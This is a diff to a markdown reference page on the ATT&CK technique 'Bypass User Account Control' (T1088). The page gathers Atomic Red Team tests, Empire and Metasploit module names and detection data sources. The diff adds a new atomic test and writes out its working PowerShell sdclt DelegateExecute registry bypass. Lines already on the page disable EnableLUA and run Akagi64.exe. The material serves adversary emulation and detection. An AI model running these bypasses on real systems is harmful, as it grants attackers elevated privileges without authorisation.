@@ -15,14 +15,20 @@ Many methods have been discovered to bypass UAC. The Github readme page for UACM
 
 Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Windows User Account Control']
 * Effective Permissions: ['Administrator']
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User', 'Administrator']
 * Platforms: ['Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1088
 
@@ -58,6 +64,11 @@ Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 mkdir "\\?\C:\Windows \System32\"
 copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
 mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+
+New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
+New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+Start-Process -FilePath $env:windir\system32\sdclt.exe
+Start-Sleep -s 3
 
 {'windows': {'psh': {'command': 'New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n'}}}
 {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}
@@ -166,6 +177,16 @@ powershell/privesc/bypassuac_tokenmanipulation
              '\\System32\\mmc.exe"\n'
              'mklink c:\\testbypass.exe "\\\\?\\C:\\Windows '
              '\\System32\\mmc.exe"\n',
+  'name': None,
+  'source': 'atomics/T1088/T1088.yaml'},
+ {'command': 'New-Item -Force -Path '
+             '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Value '
+             "'cmd.exe /c notepad.exe'\n"
+             'New-ItemProperty -Force -Path '
+             '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Name '
+             '"DelegateExecute"\n'
+             'Start-Process -FilePath $env:windir\\system32\\sdclt.exe\n'
+             'Start-Sleep -s 3\n',
   'name': None,
   'source': 'atomics/T1088/T1088.yaml'},
  {'command': {'windows': {'psh': {'command': 'New-ItemProperty -Path '
@@ -394,7 +415,15 @@ powershell/privesc/bypassuac_tokenmanipulation
                            'attack.privilege_escalation',
                            'attack.t1088',
                            'car.2019-04-001'],
-                  'title': 'Empire PowerShell UAC Bypass'}}]
+                  'title': 'Empire PowerShell UAC Bypass'}},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4624', 'Authentication logs']},
+ {'data_source': ['System calls']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4624', 'Authentication logs']},
+ {'data_source': ['System calls']}]
 ```
 
 ## Potential Queries
@@ -440,7 +469,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                 'exploit/windows/local/bypassuac\n'
                                                                 'exploit/windows/local/bypassuac_injection\n'
                                                                 'exploit/windows/local/bypassuac_vbs'}},
- {'Atomic Red Team Test - Bypass User Account Control': {'atomic_tests': [{'description': 'Bypasses '
+ {'Atomic Red Team Test - Bypass User Account Control': {'atomic_tests': [{'auto_generated_guid': '5073adf8-9a50-4bd9-b298-a9bd2ead8af9',
+                                                                           'description': 'Bypasses '
                                                                                           'User '
                                                                                           'Account '
                                                                                           'Control '
@@ -500,7 +530,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    'Viewer '
                                                                                    '(cmd)',
                                                                            'supported_platforms': ['windows']},
-                                                                          {'description': 'PowerShell '
+                                                                          {'auto_generated_guid': 'a6ce9acf-842a-4af6-8f79-539be7608e2b',
+                                                                           'description': 'PowerShell '
                                                                                           'code '
                                                                                           'to '
                                                                                           'bypass '
@@ -565,7 +596,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    'Viewer '
                                                                                    '(PowerShell)',
                                                                            'supported_platforms': ['windows']},
-                                                                          {'description': 'Bypasses '
+                                                                          {'auto_generated_guid': '58f641ea-12e3-499a-b684-44dee46bd182',
+                                                                           'description': 'Bypasses '
                                                                                           'User '
                                                                                           'Account '
                                                                                           'Control '
@@ -632,7 +664,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    'using '
                                                                                    'Fodhelper',
                                                                            'supported_platforms': ['windows']},
-                                                                          {'description': 'PowerShell '
+                                                                          {'auto_generated_guid': '3f627297-6c38-4e7d-a278-fc2563eaaeaa',
+                                                                           'description': 'PowerShell '
                                                                                           'code '
                                                                                           'to '
                                                                                           'bypass '
@@ -700,7 +733,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    '- '
                                                                                    'PowerShell',
                                                                            'supported_platforms': ['windows']},
-                                                                          {'description': 'PowerShell '
+                                                                          {'auto_generated_guid': '3c51abf2-44bf-42d8-9111-dc96ff66750f',
+                                                                           'description': 'PowerShell '
                                                                                           'code '
                                                                                           'to '
                                                                                           'bypass '
@@ -760,7 +794,8 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    'ComputerDefaults '
                                                                                    '(PowerShell)',
                                                                            'supported_platforms': ['windows']},
-                                                                          {'description': 'Creates '
+                                                                          {'auto_generated_guid': 'f7a35090-6f7f-4f64-bb47-d657bf5b10c1',
+                                                                           'description': 'Creates '
                                                                                           'a '
                                                                                           'fake '
                                                                                           '"trusted '
@@ -839,6 +874,75 @@ powershell/privesc/bypassuac_tokenmanipulation
                                                                                    'Mocking '
                                                                                    'Trusted '
                                                                                    'Directories',
+                                                                           'supported_platforms': ['windows']},
+                                                                          {'auto_generated_guid': '3be891eb-4608-4173-87e8-78b494c029b7',
+                                                                           'description': 'Bypasses '
+                                                                                          'User '
+                                                                                          'Account '
+                                                                                          'Control '
+                                                                                          'using '
+                                                                                          'a '
+                                                                                          'fileless '
+                                                                                          'method, '
+                                                                                          'registry '
+                                                                                          'only. \n'
+                                                                                          'Upon '
+                                                                                          'successful '
+                                                                                          'execution, '
+                                                                                          'sdclt.exe '
+                                                                                          'will '
+                                                                                          'spawn '
+                                                                                          'cmd.exe '
+                                                                                          'to '
+                                                                                          'spawn '
+                                                                                          'notepad.exe\n'
+                                                                                          '[Reference '
+                                                                                          '- '
+                                                                                          'sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\n'
+                                                                                          'Adapted '
+                                                                                          'from '
+                                                                                          '[MITRE '
+                                                                                          'ATT&CK '
+                                                                                          'Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n',
+                                                                           'executor': {'cleanup_command': 'Remove-Item '
+                                                                                                           '-Path '
+                                                                                                           '"HKCU:\\Software\\Classes\\Folder" '
+                                                                                                           '-Recurse '
+                                                                                                           '-Force '
+                                                                                                           '-ErrorAction '
+                                                                                                           'Ignore\n',
+                                                                                        'command': 'New-Item '
+                                                                                                   '-Force '
+                                                                                                   '-Path '
+                                                                                                   '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" '
+                                                                                                   '-Value '
+                                                                                                   "'#{command.to.execute}'\n"
+                                                                                                   'New-ItemProperty '
+                                                                                                   '-Force '
+                                                                                                   '-Path '
+                                                                                                   '"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" '
+                                                                                                   '-Name '
+                                                                                                   '"DelegateExecute"\n'
+                                                                                                   'Start-Process '
+                                                                                                   '-FilePath '
+                                                                                                   '$env:windir\\system32\\sdclt.exe\n'
+                                                                                                   'Start-Sleep '
+                                                                                                   '-s '
+                                                                                                   '3\n',
+                                                                                        'elevation_required': False,
+                                                                                        'name': 'powershell'},
+                                                                           'input_arguments': {'command.to.execute': {'default': 'cmd.exe '
+                                                                                                                                 '/c '
+                                                                                                                                 'notepad.exe',
+                                                                                                                      'description': 'Command '
+                                                                                                                                     'to '
+                                                                                                                                     'execute',
+                                                                                                                      'type': 'string'}},
+                                                                           'name': 'Bypass '
+                                                                                   'UAC '
+                                                                                   'using '
+                                                                                   'sdclt '
+                                                                                   'DelegateExecute',
                                                                            'supported_platforms': ['windows']}],
                                                          'attack_technique': 'T1088',
                                                          'display_name': 'Bypass '
